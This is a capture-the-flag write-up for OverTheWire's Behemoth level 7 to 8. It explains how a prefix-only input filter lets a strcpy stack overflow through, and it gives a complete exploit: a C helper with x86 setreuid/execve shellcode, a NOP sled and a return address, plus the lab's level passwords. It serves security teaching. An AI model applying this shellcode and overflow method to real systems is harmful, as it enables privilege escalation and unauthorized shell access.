# Behemoth Level 07 to 08

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Behemoth |
| Level | 7 -> 8 |
| Status | Complete |

## Objective

Exploit the stack overflow in `behemoth7` despite its alphabetic-input filter and spawn a shell as `behemoth8`.

## Given Access

User: `behemoth7`

Password:

```text
sV17oOQTKc
```

## Recon

Disassembly showed two critical facts:

- `strcpy()` copies `argv[1]` into a local `0x20c`-byte buffer.
- the alphabetic filter only checks up to `0x1ff` bytes, then stops.

That means the first 512 bytes of the argument must be alphabetic, but everything after that can be raw overflow material. The verified saved-return offset was `528`.

A GDB run with the return address set to `0x42424242` showed that, at crash time, `ESP` pointed into the post-return NOP sled around `0xffffd060`, and the staged shellcode started around `0xffffd160`.

A plain `/bin/sh` payload was again insufficient; the working shellcode first called `setreuid(13008,13008)` and then `execve("/bin/sh")`.

## Method

1. Fill the first `528` bytes with `A` so the filter sees only alphabetic input.
2. Overwrite the saved return address with `0xffffd0e0`, a verified landing point inside the NOP sled.
3. Place a 256-byte NOP sled after the return address.
4. Append privilege-preserving shellcode after the sled.
5. Execute the payload through a tiny helper that calls `execv()` directly so raw bytes survive intact.

## Commands

```bash
ssh -p 2221 behemoth7@behemoth.labs.overthewire.org
cd /tmp
cat > b7x.c <<'EOF'
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

int main(void) {
    unsigned int ret = 0xffffd0e0;
    unsigned char sc[] = {
        0x31,0xc0,0xb0,0x46,0x31,0xdb,0x66,0xbb,0xd0,0x32,0x31,0xc9,0x66,0xb9,0xd0,0x32,0xcd,0x80,
        0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x53,0x89,
        0xe1,0x31,0xd2,0xb0,0x0b,0xcd,0x80
    };
    static char payload[1400];
    memset(payload, 'A', 528);
    memcpy(payload + 528, &ret, 4);
    memset(payload + 532, 0x90, 256);
    memcpy(payload + 788, sc, sizeof(sc));
    payload[788 + sizeof(sc)] = 0;
    char *args[] = {"behemoth7", payload, NULL};
    execv("/behemoth/behemoth7", args);
    return 1;
}
EOF
TMPDIR=/tmp gcc /tmp/b7x.c -o /tmp/b7x
printf 'whoami
id
cat /etc/behemoth_pass/behemoth8
exit
' | /tmp/b7x
```

## Result

Password for `behemoth8`:

```text
8yWcelJd0D
```

## Lesson

A defensive-looking input filter can still be bypassed if it validates only a prefix while an unsafe copy consumes the entire string.

## References

- https://overthewire.org/wargames/behemoth/
